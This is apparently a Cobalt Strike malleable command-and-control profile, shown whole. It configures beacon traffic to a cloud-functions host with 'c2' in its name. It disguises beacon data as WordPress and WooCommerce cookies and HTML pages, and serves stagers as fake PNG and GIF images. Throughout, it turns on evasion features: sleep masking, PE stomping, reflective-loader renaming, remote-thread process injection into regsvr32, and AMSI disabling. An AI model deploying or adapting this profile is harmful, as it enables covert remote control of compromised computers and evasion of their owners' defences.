set sample_name "05d06bd7";
set sleeptime "5";
set jitter "39";
set tcp_port "1726";
set useragent "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9";
set host_stage "false";

dns-beacon {
set dns_idle "170.34.57.126";
set dns_stager_subhost "ns0.";
set maxdns "247";
set dns_sleep "124";
set dns_ttl "3600";
set dns_max_txt "252";
set beacon "speaker.";
set get_A "dns.";
set get_AAAA "online.";
set get_TXT "tiny.";
set put_metadata "front.";
set put_output "back.";
set ns_response "zero";
}

set pipename "dce_##";
set pipename_stager "fullduplex_##";

http-config {
	header "Server" "Apache";
}

http-get "default" {

	set uri "/c2Get";

	client {

		header "Host" "us-central1-funktionalc2.cloudfunctions.net";
		header "Connection" "close";

		metadata {
			base64url;
			base64;
			prepend "wordpress_ed1f617bbd6c004cc09e046f3c1b7148=";
			header "Cookie";
		}


	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/html";
		header "Server" "apache";

		output {
			mask;
			base64;
			prepend "<!DOCTYPE html><html class='no-js' lang='en-US'>  <head>    <meta http-equiv='X-UA-Compatible' content='IE=EDGE' />    <meta charset='utf-8'>    <meta name='viewport' content='width=device-width, initial-scale=1' />    <meta name='apple-itunes-app' content='app-id=1089249069'>    <title>Untitled</title><meta name='description' content='";
			print;
		}

	}

}
http-post "default" {

	set uri "/c2Get";

	client {


		output {
			netbios;
			base64;
			prepend "insert=";
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "cloudflare";

		output {
			base64;
			print;
		}

	}

}
http-stager "default" {

	set uri_x86 "/static-directory/RELEASE.png";
	set uri_x64 "/wp-includes/be.png";

	client {

		header "Host" "us-central1-funktionalc2.cloudfunctions.net";
		header "Connection" "close";
		header "Accept-Language" "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5";

	}
	server {

		header "Content-Type" "image/png";
		header "Server" "Apache";
		header "Connection" "close";

		output {
			print;
		}

	}

}
stage {

	set checksum "5";
	set userwx "false";
	set image_size_x86 "541637";
	set image_size_x64 "547069";
	set sleep_mask "true";
	set cleanup "true";
	set stomppe "true";
	set obfuscate "true";
	set compile_time "14 Feb 2023 15:20:27";
	set entry_point "87314";
	set name "debugsafely.dll";

	transform-x86 {
		prepend "\x90\x90\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "DebugSafely";
	}

	transform-x64 {
		prepend "\x90\x90\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "DebugSafely";
	}

}

process-inject {

	set allocator "VirtualAllocEx";
	set min_alloc "22921";
	set userwx "false";
	set startrwx "false";

	transform-x86 {
		prepend "\x90\x90\x90\x90";
	}
	transform-x64 {
		prepend "\x90\x90\x90\x90";
	}

	execute {
		CreateThread;
		RtlCreateUserThread;
		CreateRemoteThread;
	}

}

post-ex {
	set spawnto_x86 "%windir%\\syswow64\\regsvr32.exe";
	set spawnto_x64 "%windir%\\sysnative\\regsvr32.exe";
	set obfuscate "true";
	set smartinject "true";
	set amsi_disable "true";
}

http-get "variant_1" {

	set uri "/c2Get";

	client {

		header "Host" "us-central1-funktionalc2.cloudfunctions.net";
		header "Connection" "close";
		header "Accept-Encoding" "gzip";
		header "Accept-Language" "en-US";

		metadata {
			base64url;
			base64;
			prepend "woocommerce_cart_hash=";
			header "Cookie";
		}

		parameter "run" "false";

	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/html";
		header "Server" "apache";

		output {
			base64;
			base64;
			prepend "<!DOCTYPE html><html class='no-js' lang='en-US'>  <head>    <meta http-equiv='X-UA-Compatible' content='IE=EDGE' />    <meta charset='utf-8'>    <meta name='viewport' content='width=device-width, initial-scale=1' />    <meta name='apple-itunes-app' content='app-id=1089249069'>    <title>Untitled</title><meta name='description' content='";
			print;
		}

	}

}
http-post "variant_1" {

	set uri "/c2Post";

	client {

		header "Host" "us-central1-funktionalc2.cloudfunctions.net";
		header "Connection" "close";
		header "Content-Type" "application/x-www-form-urlencoded";

		output {
			mask;
			base64;
			prepend "grant=";
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "Pagely Gateway/1.5.1";

		output {
			base64;
			print;
		}

	}

}
http-stager "variant_1" {

	set uri_x86 "/files/an.gif";
	set uri_x64 "/static-directory/rs.gif";

	client {

		header "Host" "us-central1-funktionalc2.cloudfunctions.net";
		header "Connection" "close";
		header "Accept" "image/*";
		header "Accept-Encoding" "br";

	}
	server {

		header "Content-Type" "image/gif";
		header "Server" "apache";
		header "Connection" "close";

		output {
			print;
		}

	}

}
